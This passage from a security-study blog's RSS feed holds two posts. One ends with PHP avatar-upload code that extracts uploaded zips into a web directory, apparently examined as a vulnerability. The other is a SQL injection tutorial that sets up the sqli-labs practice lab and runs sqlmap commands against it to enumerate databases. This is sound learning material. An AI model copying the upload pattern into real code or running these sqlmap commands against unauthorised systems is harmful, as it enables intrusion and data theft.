class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;upload&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 大众版头像上传处理 2014-6-15&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$GLOBALS&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;HTTP_RAW_POST_DATA&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;function_exists&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;iconv&amp;#x27;&lt;/span&gt;) ? &lt;span class=&#34;title function_ invoke__&#34;&gt;iconv&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;UTF-8&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;GBK&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;环境不支持&amp;#x27;&lt;/span&gt;) : &lt;span class=&#34;string&#34;&gt;&amp;#x27;The php does not support&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 创建图片存储文件夹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt; = FCPATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;member/uploadfile/member/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;uid.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;title function_ invoke__&#34;&gt;file_exists&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;mkdir&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0777&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;avatar.zip&amp;#x27;&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;// 存储flashpost图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;file_put_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$GLOBALS&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;HTTP_RAW_POST_DATA&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 解压缩文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;load-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;library&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Pclzip&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;pclzip-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;PclFile&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;pclzip-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;listContent&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;function_exists&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;iconv&amp;#x27;&lt;/span&gt;) ? &lt;span class=&#34;title function_ invoke__&#34;&gt;iconv&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;UTF-8&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;GBK&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件已损坏&amp;#x27;&lt;/span&gt;) : &lt;span class=&#34;string&#34;&gt;&amp;#x27;The file has damaged&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 验证文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$t&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;strpos&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$t&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;stored_filename&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;string&#34;&gt;&amp;#x27;..&amp;#x27;&lt;/span&gt;) !== &lt;span class=&#34;literal&#34;&gt;FALSE&lt;/span&gt; ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;title function_ invoke__&#34;&gt;strpos&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$t&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;string&#34;&gt;&amp;#x27;..&amp;#x27;&lt;/span&gt;) !== &lt;span class=&#34;literal&#34;&gt;FALSE&lt;/span&gt; ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;title function_ invoke__&#34;&gt;strpos&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$t&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;) !== &lt;span class=&#34;literal&#34;&gt;FALSE&lt;/span&gt; ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;title function_ invoke__&#34;&gt;strpos&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$t&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;stored_filename&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;) !== &lt;span class=&#34;literal&#34;&gt;FALSE&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;function_exists&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;iconv&amp;#x27;&lt;/span&gt;) ? &lt;span class=&#34;title function_ invoke__&#34;&gt;iconv&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;UTF-8&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;GBK&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;非法名称的文件&amp;#x27;&lt;/span&gt;) : &lt;span class=&#34;string&#34;&gt;&amp;#x27;llegal name file&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;strrchr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$t&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;stored_filename&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;), &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;function_exists&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;iconv&amp;#x27;&lt;/span&gt;) ? &lt;span class=&#34;title function_ invoke__&#34;&gt;iconv&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;UTF-8&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;GBK&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件格式校验不正确&amp;#x27;&lt;/span&gt;) : &lt;span class=&#34;string&#34;&gt;&amp;#x27;The document format verification is not correct&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 解压文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;pclzip-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;extract&lt;/span&gt;(PCLZIP_OPT_PATH, &lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;, PCLZIP_OPT_REPLACE_NEWER) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            @&lt;span class=&#34;title function_ invoke__&#34;&gt;dr_dir_delete&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;pclzip-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;zip&lt;/span&gt;(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;title function_ invoke__&#34;&gt;is_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;45x45.jpg&amp;#x27;&lt;/span&gt;) || !&lt;span class=&#34;title function_ invoke__&#34;&gt;is_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;90x90.jpg&amp;#x27;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;文件创建失败&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/</guid>
            <title>SQL injection</title>
            <link>http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/</link>
            <category>SQL injection</category>
            <pubDate>Wed, 16 Mar 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
&lt;h3 id=&#34;1sqli-labs-master-安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1sqli-labs-master-安装&#34;&gt;#&lt;/a&gt; 1.sqli-labs-master 安装&lt;/h3&gt;
&lt;p&gt;下面在 linux 中安装，虚拟机地址为 192.168.1.155，端口号为 18888，使用宝塔面板&lt;/p&gt;
&lt;h4 id=&#34;1将sqli-labs-master移动到网站根目录下解压&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1将sqli-labs-master移动到网站根目录下解压&#34;&gt;#&lt;/a&gt; 1. 将 sqli-labs-master 移动到网站根目录下，解压&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;unzip sqli-labs-master&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469835321-5363494e-a8b7-4796-99a0-97f475cef370.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2修改配置文件配合文件为sqlisql-connectionsdb-credsinc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2修改配置文件配合文件为sqlisql-connectionsdb-credsinc&#34;&gt;#&lt;/a&gt; 2. 修改配置文件，配合文件为： &lt;code&gt;sqli/sql-connections/db-creds.inc&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;vim sqli/sql-connections/db-creds.inc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;数据库用户名和密码在宝塔面板中可以修改&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469904204-6c29948a-2cdc-4f11-8e01-58f8ed2dbe83.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469999346-dca351bf-b5d0-4a51-9ff1-dab559edf120.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行&#34;&gt;#&lt;/a&gt; 3. 浏览器打开，输入对应的文件路径，安装数据库，如果第二步有错，此步将不能正常执行&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470033800-7e58d43a-1835-4303-906c-05a0d03dd762.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;4验证安装完成后即可按到如下界面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4验证安装完成后即可按到如下界面&#34;&gt;#&lt;/a&gt; 4. 验证安装完成后，即可按到如下界面&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470107086-065656d0-7044-4c09-9323-5e799f726534.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2sqlmap-安装与使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2sqlmap-安装与使用&#34;&gt;#&lt;/a&gt; 2.sqlmap 安装与使用&lt;/h3&gt;
&lt;h4 id=&#34;1kali联网&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1kali联网&#34;&gt;#&lt;/a&gt; 1.kali 联网&lt;/h4&gt;
&lt;p&gt;选择桥接时，只需要将虚拟机和物理主机 ip 置于一个网段中&lt;/p&gt;
&lt;p&gt;如果不能联网，修改 &lt;code&gt;/etc/network/interfaces&lt;/code&gt;   ，设置 ip，网关，掩码&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt; /etc/network/interfaces.d/*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# The loopback network interface**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auto lo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iface lo inet loopback&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auto eth0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iface eth0 inet static&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;address 192.168.0.66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gateway 192.168.1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netmask 255.255.254.0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;2修改dns-etcresolvconf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2修改dns-etcresolvconf&#34;&gt;#&lt;/a&gt; 2. 修改 DNS，  &lt;code&gt;/etc/resolv.conf&lt;/code&gt;&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nameserver 8.8.8.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nameserver 114.114.114.114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;search localdomain&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;3重启网络服务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3重启网络服务&#34;&gt;#&lt;/a&gt; 3. 重启网络服务&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/etc/init.d/networking restart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service networking restart &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;4sqlmap使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4sqlmap使用&#34;&gt;#&lt;/a&gt; 4.sqlmap 使用&lt;/h4&gt;
&lt;p&gt;下载：Github：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw&#34;&gt;https://github.com/sqlmapproject/sqlmap&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;5sqlmap支持的注入技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5sqlmap支持的注入技术&#34;&gt;#&lt;/a&gt; 5.SQLMAP 支持的注入技术&lt;/h4&gt;
&lt;p&gt;​	基于布尔的盲注：根据返回页面判断条件真假的注入。&lt;/p&gt;
&lt;p&gt;​	基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语 句是否执行（即页面返回时间是否增加）来判断。&lt;/p&gt;
&lt;p&gt;​	基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。&lt;/p&gt;
&lt;p&gt;​	基于联合查询的注入：可以使用 UNION 的情况下的注入。&lt;/p&gt;
&lt;p&gt;​	堆查询注入：同时执行多条语句的注入。&lt;/p&gt;
&lt;h4 id=&#34;6sqlmap支持的数据库类型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6sqlmap支持的数据库类型&#34;&gt;#&lt;/a&gt; 6.SQLMAP 支持的数据库类型&lt;/h4&gt;
&lt;p&gt;​	主要包括一些关系型数据库（ RMDBS ） ， 如 MySQL 、Oracle 、PostgreSQL 、 Microsoft SQL Server 、Microsoft Access 、IBM DB2 、SQLite 、Firebird 、 Sybase、SAP MaxDB、Informix、HSQLDB 等&lt;/p&gt;
&lt;h4 id=&#34;7sqlmap用法以下用windows演示&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7sqlmap用法以下用windows演示&#34;&gt;#&lt;/a&gt; 7.sqlmap 用法 (以下用 Windows 演示)&lt;/h4&gt;
&lt;h4 id=&#34;71对于get请求爆破方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#71对于get请求爆破方式&#34;&gt;#&lt;/a&gt; 7.1 对于 get 请求爆破方式&lt;/h4&gt;
&lt;p&gt;1.sqlmap -u URL&lt;/p&gt;
&lt;p&gt;python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x&#34;&gt;http://192.168.1.4:18888/sqli/Less-1/?id=1&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;判断可注入的参数&lt;/p&gt;
&lt;p&gt;判断可以用哪种 SQL 注入技术来注入&lt;/p&gt;
&lt;p&gt;识别出所有存在的注入类型&lt;/p&gt;
&lt;p&gt;尝试去判定数据库版本、开发语言、操作系统版本&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213182954882.png&#34; alt=&#34;image-20220213182954882&#34;&gt;&lt;/p&gt;
&lt;p&gt;2.sqlmap -u URL --current-db 获得数据库名&lt;/p&gt;
&lt;p&gt;python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x&#34;&gt;http://192.168.1.4:18888/sqli/Less-1/?id=1&lt;/span&gt; --current-db&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183117274.png&#34; alt=&#34;image-20220213183117274&#34;&gt;&lt;/p&gt;
&lt;p&gt;3.sqlmap -u URL -D database --tables  获得数据库中表名&lt;/p&gt;
